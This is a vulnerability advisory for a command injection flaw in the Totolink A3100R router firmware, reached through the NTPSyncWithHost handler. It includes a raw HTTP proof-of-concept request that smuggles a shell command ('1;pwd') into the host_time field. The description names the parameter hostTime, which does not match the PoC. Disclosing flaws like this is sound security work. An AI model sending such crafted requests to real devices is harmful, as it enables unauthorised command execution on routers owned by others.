## Totolink A3100R command injection

### Overview

* Vendor: TOTOLINK

* Product: Totolink A3100R
* Version: V5.9c.4577_B20191021

* Manufacturer's address：https://www.totolink.net/
* Firmware download address ：https://www.totolink.net/data/upload/20191119/d55579f988e05db5e32f2b458dd7ef17.zip

### Vulnerability details

Totolink A3100R V5.9c.4577_B20191021 was found to contain a command injection vulnerability in the `NTPSyncWithHost` function via the `hostTime` parameter. This vulnerability allows attackers to execute arbitrary commands via a crafted request.

![image](./img/1.png)

#### PoC

```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.254
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json, text/javascript, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 138
Origin: http://192.168.0.254
Connection: close
Referer: http://192.168.0.254
Cookie: SESSION_ID=2:1801026000:2

{
    "topicurl": "NTPSyncWithHost",
    "host_time": "'1;pwd'"
}
```

